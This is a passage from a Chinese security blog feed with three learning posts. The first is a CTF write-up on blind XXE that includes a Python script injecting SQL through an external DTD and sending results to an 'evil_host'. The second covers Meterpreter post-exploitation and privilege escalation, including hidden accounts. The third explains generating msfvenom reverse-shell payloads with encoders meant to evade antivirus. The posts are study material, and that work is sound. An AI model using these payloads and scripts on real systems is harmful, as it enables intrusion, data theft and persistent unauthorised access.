class="line">javax.xml.bind.UnmarshalException  </span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An error occurred unmarshalling the document  </span><br><span class="line">Internal Exception: ████████████████████████: Connection refused</span><br></pre></td></tr></table></figure></p><p>实验五：内网盲注(CTF)<br>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p><p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错<br>如图所示：<br><img src="https://i.imgur.com/uKYlbs7.png" alt=""><br><img src="https://i.imgur.com/gpOyC5D.png" alt=""><br>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p><blockquote><p>/var/www/52dandan.cc/public_html/config.php</p></blockquote><p>拿到第一部分 flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(BASEDIR, &quot;/var/www/52dandan.club/&quot;);</span><br><span class="line">define(FLAG_SIG, 1);</span><br><span class="line">define(SECRETFILE,&apos;/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&apos;);</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>注意：<br>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法<br>压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);<br>解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);</p></blockquote><p>然后我们考虑内网有没有东西，我们读取</p><blockquote><p>/proc/net/arp<br>/etc/host</p></blockquote><p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p><p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子<br>示例代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://39.107.33.75:33899/common.php&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">        &quot;name&quot;:&quot;evil_man&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;testabcdefg@gmail.com&quot;,</span><br><span class="line">        &quot;comment&quot;:&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">                &lt;!DOCTYPE root [</span><br><span class="line">                &lt;!ENTITY % dtd SYSTEM &quot;http://evil_host/evil.dtd&quot;&gt;</span><br><span class="line">                %dtd;]&gt;</span><br><span class="line">                &quot;&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(0,28):</span><br><span class="line">        for j in range(48,123):</span><br><span class="line">                f = open(&apos;./evil.dtd&apos;,&apos;w&apos;)</span><br><span class="line">            payload2 = &quot;&quot;&quot;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3&apos;-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary(&apos;&#123;&#125;&apos;))then(0)else(1)end)-&apos;1&quot;&gt;</span><br><span class="line">                &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://evil_host/?result=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">                %all;</span><br><span class="line">                %send;&quot;&quot;&quot;.format(&apos;_&apos;*i+chr(j)+&apos;_&apos;*(27-i))</span><br><span class="line">                f.write(payload2)</span><br><span class="line">                f.close()</span><br><span class="line">                print &apos;test &#123;&#125;&apos;.format(chr(j))</span><br><span class="line">                r = s.post(url,data=data)</span><br><span class="line">                if &quot;Oti3a3LeLPdkPkqKF84xs=&quot; in r.content and chr(j)!=&apos;_&apos;:</span><br><span class="line">                        result += chr(j)</span><br><span class="line">                        print chr(j)</span><br><span class="line">                        break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这篇真的学习到很多</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-5</a><br><a href="https://xz.aliyun.com/t/122" target="_blank" rel="noopener">https://xz.aliyun.com/t/122</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      对XXE漏洞的学习
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="XXE" scheme="https://museljh.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>后渗透阶段的Meterpreter与提权的学习与实验</title>
    <link href="https://museljh.github.io/2019/02/19/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5%E7%9A%84Meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C/"/>
    <id>https://museljh.github.io/2019/02/19/后渗透阶段的Meterpreter与提权的学习与实验/</id>
    <published>2019-02-19T14:52:09.000Z</published>
    <updated>2019-02-19T14:56:23.837Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提权，是黑客的专业名词，一般用于网站入侵和系统入侵。顾名思义，提权就是提高自己在服务器中的权限。<br>大家都知道，当我们入侵了一台服务器并拿到了低权限shell时需要进行提权。<br>本文就来讲解如何提权并判断哪些低权限的shell可以提升到高级权限。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="提权前提"><a href="#提权前提" class="headerlink" title="提权前提"></a>提权前提</h3><p>1.已经拿到低权shell<br>2.被入侵的机器上面有nc，python，perl等linux非常常见的工具<br>3.有权限上传文件和下载文件</p><h3 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h3><p>1.拿到低权限shell（如webshell/服务器低权限shell）<br>2.搜索主机信息<br>3.寻找exp<br>4.尝试提权到高级别权限用户<br>5.添加隐藏账户</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>靶机 Ubuntu 18.04.1 LTS<br>攻击机 kali</p><h3 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h3><h4 id="连接靶机"><a href="#连接靶机" class="headerlink" title="连接靶机"></a>连接靶机</h4><ol><li>使用低权限账户登录<br>首先检验下昨天的学习<br>我们使用Metasploit连接我们的靶机<br>使用msfvenom生成shell脚本</li></ol><p>为了防止之后出现”Module database cache not built yet, using slow search”提示<br>首先要执行接下来三个命令</p><ol><li>service postgresql start</li><li>msfdb init</li><li>msf &gt; db_rebuild_cache</li></ol><blockquote><p>补充：PostgreSQL 数据库端口号是5432</p></blockquote><p>然后执行以下的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=192.168.65.128 LPORT=33333 -e x86/shikata_ga_nai -i 3 -f elf -o cool.elf</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/LD6xSX6.png" alt=""></p><ul><li>连接木马<br>开启msf，启用exploit/multi/handler模块。<blockquote><p>因为我两台都是虚拟机所以我们采取正向连接的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload linux/x86/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/bind_tcp</span><br><span class="line">msf exploit(handler) &gt; set RHOST 192.168.65.161</span><br><span class="line">RHOST =&gt; 192.168.65.161</span><br><span class="line">msf exploit(handler) &gt; set LPORT 33333</span><br><span class="line">LPORT =&gt; 33333</span><br><span class="line">explot</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>注意：这里set的payload跟生成木马使用的payload要一致，其余的参数根据选择的payload而填写。</p><p>在靶机执行脚本<br><img src="https://i.imgur.com/Rmh6YPq.png" alt=""><br>我们成功获取到shell<br><img src="https://i.imgur.com/2yjdldg.png" alt=""></p><h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><blockquote><p>这部分主要参考</p></blockquote><blockquote><p><a href="https://paper.seebug.org/29/" target="_blank" rel="noopener">https://paper.seebug.org/29/</a></p></blockquote><h5 id="meterpreter介绍"><a href="#meterpreter介绍" class="headerlink" title="meterpreter介绍"></a>meterpreter介绍</h5><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。<br>meterpreter很强大,如果可以尽力使用</p><h5 id="Meterpreter中常用的Shell"><a href="#Meterpreter中常用的Shell" class="headerlink" title="Meterpreter中常用的Shell"></a>Meterpreter中常用的Shell</h5><p>1、reverse_tcp</p><blockquote><p>这是一个基于TCP的反弹shell，</p></blockquote><p>2、reverse_http</p><blockquote><p>基于http方式的反向连接，在网速慢的情况下不稳定。</p></blockquote><p>3、reverse_https</p><blockquote><p>基于https方式的反向连接，在网速慢的情况下不稳定。</p></blockquote><p>4、bind_tcp</p><blockquote><p>这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p></blockquote><h5 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h5><h6 id="命令大全"><a href="#命令大全" class="headerlink" title="命令大全"></a>命令大全</h6><p>在meterpreter下面进行help：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Drop into irb scripting mode</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &apos;load&apos;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    pwd           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    arp           Display the host ARP cache</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    netstat       Display the network connections</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    kill          Terminate a process</span><br><span class="line">    ps            List running processes</span><br><span class="line">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    suspend       Suspends or resumes a list of processes</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br></pre></td></tr></table></figure></p><p>可以看到有很多命令工具可以使用，非常方便！</p><h6 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h6><ol><li>background：这个命令是将当前的session放到后台运行，可以在msf中继续其他渗透任务；</li><li>sessions：这个命令需要配合上面的background使用，该命令是将后台的会话打开，进行会话操作。 可以使用sessions -i id 重新连接在后台的session会话</li><li>quit   退出会话  </li><li>shell  获得控制台权限  </li><li>irb  开启ruby终端<h6 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h6></li><li>cat  查看文件内容  </li><li>getwd  查看当前工作目录  </li><li>upload   上传文件到目标机上  </li><li>download  下载文件到本机上  </li><li>edit  编辑文件  </li><li>search   搜索文件<h6 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h6></li><li>ipconfig / ifconfig  查看网络接口信息  </li><li>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  端口转发，本机监听4444，把目标机3389转到本机4444 </li><li>rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 然后使用rdesktop来连接，-u 用户名 -p 密码</li><li>route  获取路由表信息<h6 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h6></li><li>ps  查看当前活跃进程 </li><li>migrate pid 将Meterpreter会话移植到进程数位pid的进程中 migrate将进程转移至其他稳定进程中，实战用需要。</li><li>execute -H -i -f cmd.exe  创建新进程cmd.exe，-H不可见，-i交互 </li><li>getpid  获取当前进程的pid </li><li>kill pid  杀死进程 </li><li>getuid  查看权限 </li><li>sysinfo  查看目标机系统信息，如机器名，操作系统等 </li><li>shutdown  关机<h5 id="后渗透攻击模块-windos"><a href="#后渗透攻击模块-windos" class="headerlink" title="后渗透攻击模块(windos)"></a>后渗透攻击模块(windos)</h5><blockquote><p>这部分主要参考（包括维权）</p><blockquote><p><a href="https://paper.seebug.org/29/" target="_blank" rel="noopener">https://paper.seebug.org/29/</a></p></blockquote></blockquote></li></ol><h4 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h4><h5 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h5><p>利用meterpreter中的getsystem命令，该命令自动寻找各种可能的适应技术，以便将用户权限提升到更高级别。默认值0会尝试所有列出技术来尝试提权，直至成功。提权方式采用命令管道模拟提升的方法和令牌复制的方法。该命令使用方便，并且简单高效，在渗透测试中会频繁使用到，建议所有提权过程中先行尝试此方法。</p><h5 id="利用本地漏洞"><a href="#利用本地漏洞" class="headerlink" title="利用本地漏洞"></a>利用本地漏洞</h5><p>本地漏洞提权，即使用本地漏洞的利用程序（loca&gt;exploit）提升权限。就是说通过运行一些现成的造成溢出漏洞的exploit,把用户从users组或其它系统用户中提升到administrators组（或root）。<br>溢出漏洞就像杯子里装水,水多了杯子装不进去,就会把里面的水溢出来。而相对计算机来说计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了。</p><p>输入命令shell进入目标机CMD命令行，再利用systeminfo命令或者通过查询 c:\windows\ 里留下的补丁号.log来看看目标机大概打了哪些补丁。<br>查看目标主机有无打补丁，我们可以尝试利用Windows下已有的漏洞提权，如ms13_053,ms14_058,ms16_016,ms16_032等等。</p><p>成功利用好这个进程后记得，使用migrate命令迁移到该进程中</p><p>剩余方法 <a href="https://xz.aliyun.com/t/258" target="_blank" rel="noopener">传送门</a></p><h4 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h4><blockquote><p><a href="https://xz.aliyun.com/t/2512" target="_blank" rel="noopener">https://xz.aliyun.com/t/2512</a></p></blockquote><h5 id="搜索exp，上传"><a href="#搜索exp，上传" class="headerlink" title="搜索exp，上传"></a>搜索exp，上传</h5><ol><li>将提权脚本上传到服务器/tmp目录下</li><li>在服务器上运行检测脚本，可在输出结果中找到相关漏洞信息站点及攻击载荷</li><li>访问漏洞信息网站，查看漏洞信息，下载利用脚本<blockquote><p>可以在这里搜索</p></blockquote></li></ol><blockquote><p><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com/</a></p></blockquote><ol start="3"><li>或者使用Kali本地searchsploit（metasploit），寻找对应编号的exp,尝试提权</li><li>选择一个payload上传到服务器</li><li>在服务器上执行提权代码，发现编译失败，提示版本错误</li><li>检测靶机内核版本</li><li>执行脚本，寻找对应内核版本的exp,</li><li>访问网址，获取exp</li><li>更换exp,再次尝试</li><li>运行提权代码<blockquote><p>不行就换不断尝试</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/2853" target="_blank" rel="noopener">https://xz.aliyun.com/t/2853</a><br><a href="https://www.freebuf.com/articles/system/129549.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/129549.html</a><br><a href="https://xz.aliyun.com/t/2862" target="_blank" rel="noopener">https://xz.aliyun.com/t/2862</a><br><a href="https://www.anquanke.com/post/id/87292" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87292</a><br><a href="https://xz.aliyun.com/search?page=1&amp;keyword=%E6%8F%90%E6%9D%83" target="_blank" rel="noopener">https://xz.aliyun.com/search?page=1&amp;keyword=%E6%8F%90%E6%9D%83</a><br><a href="https://xz.aliyun.com/t/2512" target="_blank" rel="noopener">https://xz.aliyun.com/t/2512</a><br><a href="https://blog.csdn.net/freestyle4568world/article/details/54712901" target="_blank" rel="noopener">https://blog.csdn.net/freestyle4568world/article/details/54712901</a></p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      后渗透阶段的Meterpreter与提权的学习与实验
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="Matesploit" scheme="https://museljh.github.io/tags/Matesploit/"/>
    
  </entry>
  
  <entry>
    <title>msf构造出shell反弹脚本</title>
    <link href="https://museljh.github.io/2019/02/18/msf%E6%9E%84%E9%80%A0%E5%87%BAshell%E5%8F%8D%E5%BC%B9%E8%84%9A%E6%9C%AC/"/>
    <id>https://museljh.github.io/2019/02/18/msf构造出shell反弹脚本/</id>
    <published>2019-02-18T08:27:32.000Z</published>
    <updated>2019-02-18T08:31:08.594Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Liunx下能够构造shell反弹脚本有很多常见的如bash，netcat、socat以及各种语言如果想具体了解的话可以看<a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">这里</a>，当然今天主要内容是详细介绍msfvenom如何生成shell脚本。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="metasploit-framework介绍"><a href="#metasploit-framework介绍" class="headerlink" title="metasploit-framework介绍"></a>metasploit-framework介绍</h3><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。<br>Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode档案、安全研究等内容。<br>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。–维基百科</p><h3 id="如何安装metasploit-framework？"><a href="#如何安装metasploit-framework？" class="headerlink" title="如何安装metasploit-framework？"></a>如何安装metasploit-framework？</h3><p>在kali-Linux中有自带metasploit-framework<br>当然假如你已经有了一个基于 Debian 的 Linux 环境 如ubuntu<br>你可以通过以下命令下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  ./msfinstall</span><br></pre></td></tr></table></figure></p><p>当然假如你是windows系统那么可以通过</p><blockquote><p><a href="https://windows.metasploit.com/metasploitframework-latest.msi" target="_blank" rel="noopener">https://windows.metasploit.com/metasploitframework-latest.msi</a></p></blockquote><p>下载并且安装</p><p>Mac下安装metasploit<br>mac下安装metasploit比较简单，官网下载pkg安装包，直接安装即可；需要注意的是安装完成后的路径。<br>msfconsole路径：</p><blockquote><p>/opt/metasploit-framework/bin<br>msf的插件路径：<br>   /opt/metasploit-framework/embedded/framework/modules/exploits</p></blockquote><p>当然假如以上步骤都不可以那么建议可以在metasploit-framework官网上进行安装<a href="https://www.metasploit.com/" target="_blank" rel="noopener">传送门</a></p><h3 id="如何深入了解metasploit-framework"><a href="#如何深入了解metasploit-framework" class="headerlink" title="如何深入了解metasploit-framework?"></a>如何深入了解metasploit-framework?</h3><p>通过阅读<a href="https://metasploit.help.rapid7.com/docs" target="_blank" rel="noopener">metasploit-framework官方手册</a>你可以快速入门metasploit-framework</p><h3 id="msfvenom-介绍"><a href="#msfvenom-介绍" class="headerlink" title="msfvenom 介绍"></a>msfvenom 介绍</h3><p>MSFvenom是Msfpayload和Msfencode的组合，将这两个工具放在一个Framework实例中。可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线<br>msfvenom的优点是：</p><p>一个工具<br>标准化命令行选项<br>提高速度</p><h3 id="msfvenom-使用"><a href="#msfvenom-使用" class="headerlink" title="msfvenom 使用"></a>msfvenom 使用</h3><h3 id="如何生成一个有效的反弹shell脚本呢"><a href="#如何生成一个有效的反弹shell脚本呢" class="headerlink" title="如何生成一个有效的反弹shell脚本呢"></a>如何生成一个有效的反弹shell脚本呢</h3><p>我们可以看一个例子，输入下面msfvenom命令行及其输出的示例：</p><blockquote><p>msfvenom -a x86 –platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f python</p></blockquote><p><img src="https://i.imgur.com/fWKiN2i.png" alt=""></p><p>查看支持的输出文件类型：</p><blockquote><p>   msfvenom –help-formats</p></blockquote><p>如果想要查看Framework的有效负载，可以执行</p><blockquote><p>msfvenom -l payloads</p></blockquote><p><img src="https://i.imgur.com/Zpbw7xw.png" alt=""></p><blockquote><p>msfvenom -l nops</p></blockquote><p>基础payload<br>命令格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure></p><p>通常，这可能是您使用msfvenom的方式：</p><blockquote><p>./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker’s IP] lport=4444 -f exe -o /tmp/my_payload.exe</p></blockquote><h4 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h4><h4 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h4><p>如何编码有效负载？<br>默认情况下，使用-b标志（badchar标志）时，编码功能将自动启动。在其他情况下，您必须使用-e标志，如下所示：</p><p>如下所示：<br>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</p><p>查看支持的编码方式：(为了达到免杀的效果)<br>msfvenom -l encoders </p><p>查看支持的空字段模块：(为了达到免杀的效果)<br>msfvenom -l nops</p><h4 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h4><p>-f标志：指定有效负载的格式<br>语法示例：./msfvenom -p windows/meterpreter/bind_tcp -f exe</p><h4 id="LHOST-LPORT"><a href="#LHOST-LPORT" class="headerlink" title="LHOST/LPORT"></a>LHOST/LPORT</h4><blockquote><p>LHOST - 该参数表示你想让你的监听器绑定的 IP 地址<br>LPORT - 该参数表示你想让你的监听器绑定的端口号</p></blockquote><p>LHOST - 从字面上看，该参数表示你想让你的目标机器连接的地址。如果你在一个本地局域网，那么你的目标机器可能就不能直接连接到你的机器了，除非你们在同一个网络中。这种情况下，你需要 找到你的公网IP ，然后在你的网络中配置端口转发连接到你自己的用来攻击的电脑。LHOST 这个参数不可以被设置为 localhost, 0.0.0.0, 127.0.0.1，如果你这么设置了，那么你其实在让目标机器连接自己。<br>LPORT - 这个参数表示目标机器要连接的端口号</p><h4 id="b"><a href="#b" class="headerlink" title="-b"></a>-b</h4><p>如何避免部分字符过滤呢<br>-b标志用于避免有效负载中的某些字符。使用此选项时，msfvenom将自动找到合适的编码器来编码有效负载：</p><blockquote><p>./msfvenom -p windows/meterpreter/bind_tcp -b ‘\x00’ -f raw</p></blockquote><h4 id="p"><a href="#p" class="headerlink" 